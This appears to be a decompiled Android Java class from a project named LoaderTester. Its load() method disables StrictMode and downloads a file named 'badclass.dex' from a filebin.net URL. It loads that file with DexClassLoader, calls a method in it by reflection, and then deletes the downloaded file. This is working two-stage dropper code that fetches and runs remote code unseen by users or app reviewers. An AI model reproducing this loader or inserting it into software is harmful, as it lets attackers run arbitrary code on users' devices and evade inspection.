package com.example.doubleloadbase;

import android.content.Context;
import android.os.StrictMode;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

/* loaded from: /home/devilsharu/AndroidStudioProjects/LoaderTester/app/src/main/assets/double */
public class example {
    Context context;

    public example(Context context) {
        this.context = context;
    }

    public String load(String str, int i, Context context) {
        System.out.println(str);
        System.out.println(i);
        System.out.println(context);
        System.out.println("0");
        StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder().permitAll().build());
        try {
            System.out.println("1");
            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL("https://filebin.net/up5y45cysl5w35l3/badclass.dex").openConnection();
            httpURLConnection.connect();
            if (httpURLConnection.getResponseCode() != 200) {
                return "";
            }
            InputStream inputStream = httpURLConnection.getInputStream();
            FileOutputStream openFileOutput = this.context.openFileOutput("doubleFile", 0);
            byte[] bArr = new byte[1024];
            while (true) {
                int read = inputStream.read(bArr);
                if (read != -1) {
                    openFileOutput.write(bArr, 0, read);
                } else {
                    openFileOutput.close();
                    inputStream.close();
                    httpURLConnection.disconnect();
                    File file = new File(this.context.getFilesDir() + "/doubleFile");
                    DexClassLoader dexClassLoader = new DexClassLoader(this.context.getFilesDir() + "/doubleFile", null, null, getClass().getClassLoader());
                    System.out.println("2");
                    Class loadClass = dexClassLoader.loadClass("s5.a");
                    System.out.println("3");
                    Constructor constructor = loadClass.getConstructor(new Class[0]);
                    System.out.println("4");
                    Object newInstance = constructor.newInstance(new Object[0]);
                    System.out.println("5");
                    Method method = loadClass.getMethod("a", new Class[0]);
                    System.out.println("6");
                    String str2 = (String) method.invoke(newInstance, new Object[0]);
                    file.delete();
                    return str2;
                }
            }
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        } catch (InvocationTargetException e2) {
            throw new RuntimeException(e2);
        } catch (MalformedURLException e3) {
            throw new RuntimeException(e3);
        } catch (IOException e4) {
            throw new RuntimeException(e4);
        } catch (IllegalAccessException e5) {
            throw new RuntimeException(e5);
        } catch (InstantiationException e6) {
            throw new RuntimeException(e6);
        } catch (NoSuchMethodException e7) {
            throw new RuntimeException(e7);
        }
    }
}